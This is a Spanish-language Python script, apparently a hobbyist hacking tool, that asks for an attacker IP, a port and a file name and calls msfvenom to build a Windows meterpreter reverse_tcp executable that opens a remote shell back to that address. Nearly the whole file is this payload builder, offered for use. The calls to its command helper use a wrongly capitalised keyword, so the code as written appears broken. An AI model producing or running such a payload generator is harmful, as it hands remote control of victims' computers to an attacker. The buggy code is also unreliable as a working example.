# Desarrollado Por NesAnTime, Todos los derechos Reservados
from tqdm import tqdm
import os
import subprocess
import platform
import time
from colorama import init, Fore, Style
import webbrowser
init(autoreset=True)

def clear():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
def reverse(seg):
    time.sleep(seg)
def Barra(desc):
    lista_de_elementos = range(10)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)
def Comand(shell):
    try:
        subprocess.run(shell, shell=True, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error Al Ejecutar Comandos :( {e}")
        input(Fore.YELLOW + "\nPresione Enter Para Finalizar... ")
        webbrowser.open("https://nesantimeproyect.blogspot.com/p/errores-comunes-sysnes.html")
def Logo():
    print(f"\n {Fore.CYAN}[+] Creado Por NesAnTime [+] \n")
    print("  ██████▓██   ██▓  ██████       ▄▄▄█████▓ ▒█████   ▒█████   ██▓    ")
    print("▒██    ▒ ▒██  ██▒▒██    ▒       ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ")
    print("░ ▓██▄    ▒██ ██░░ ▓██▄         ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ")
    print("  ▒   ██▒ ░ ▐██▓░  ▒   ██▒      ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ")
    print("▒██████▒▒ ░ ██▒▓░▒██████▒▒        ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒")
    print("▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░        ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░")
    print("░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░          ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░")
    print("░  ░  ░  ▒ ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ")
    print("      ░  ░ ░           ░                     ░ ░      ░ ░      ░  ░")
    print("         ░ ░                                                       ")
#----------------------------------------------------------------------------------------------------------------------------------------
clear()
Logo()
print(Fore.BLUE + "[!] A Continuacion, Se Completara La Creacion Del Archivo EXE (reverb shell atraves tcp)\n")

direccionIP = input(f"{Fore.RED}[SYS-Create EXE]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Ingrese Su Direccion IP: ")
opc = input(f"{Fore.RED}[SYS-Create EXE] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}La Direccion IP {Fore.CYAN + direccionIP + Fore.RESET}, Ingresada ¿Es Correcta? (y/n): ")
while (opc == "n"):
    direccionIP = input(f"{Fore.RED}[SYS-Create EXE] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}Ingrese Nuevamente Su Direccion IP: ")
    opc = input(f"{Fore.RED}[SYS-Create EXE] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}La Direccion IP {Fore.CYAN + direccionIP + Fore.RESET}, Ingresada ¿Es Correcta? (y/n): ")

print(Fore.GREEN + f"[!] Se Ha Establecido Tu Direccion IP ({direccionIP}), ¡Correctamente!")
reverse(seg=1.5)

clear()
Logo()
print(Fore.BLUE + "[!] A Continuacion, Se Completara La Creacion Del Archivo EXE (reverb shell atraves tcp)\n")
port = int(input(f"{Fore.RED}[Create EXE]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Proporcione un Puerto de Escucha: "))
print(Fore.GREEN + f"[!] El Puerto de Escucha ({str(port)}) Se ha Establecido Correctamente..\n")
reverse(seg=1.5)

clear()
Logo()
print(Fore.BLUE + "*** Terminando La Creacion del EXE ;) *** ")
name = input(f"\n{Fore.RED}[SYS-Create APK]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Ingrese un Nombre para el archivo: ")
reverse(seg=1)
print(Fore.GREEN + "[!] Se Ha establecido El Nombre del Archivo ¡Correctamente! ")
reverse(seg=1)
clear()
print(f"{Fore.RED}[SYS-Create EXE]{Fore.RESET}- {Fore.GREEN}[!] Creando Archivos de Inyeccion Del .bat")
Comand(Shell = f"mkdir EXEs")
reverse(seg=1)
print(f"{Fore.RED}[SYS-Create EXE]{Fore.RESET}- {Fore.GREEN}[!] Creando Logica Meterpreter...")
reverse(seg=1)
Barra(desc="Redireccionando Archivos A Flujo de Inyeccion...")
clear()
Comand(Shell = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={direccionIP} LPORT={str(port)} -f exe -o EXEs/{name}.exe")

print("\n ---------- Se Ha Creado El Archivo .EXE Correctamente ---------- \n")
print("***______ Informacion Y Detalles ______***")
print(f"{Fore.CYAN}IP: {Fore.RESET + direccionIP}")
print(f"{Fore.CYAN}PUERTO: {Fore.RESET + str(port)}")
print(f"{Fore.CYAN}Nombre: {Fore.RESET + name}.exe")
print(f"{Fore.RED + Style.BRIGHT}RUTA DEL EXE: {Fore.RESET} EXEs/{name}.exe")



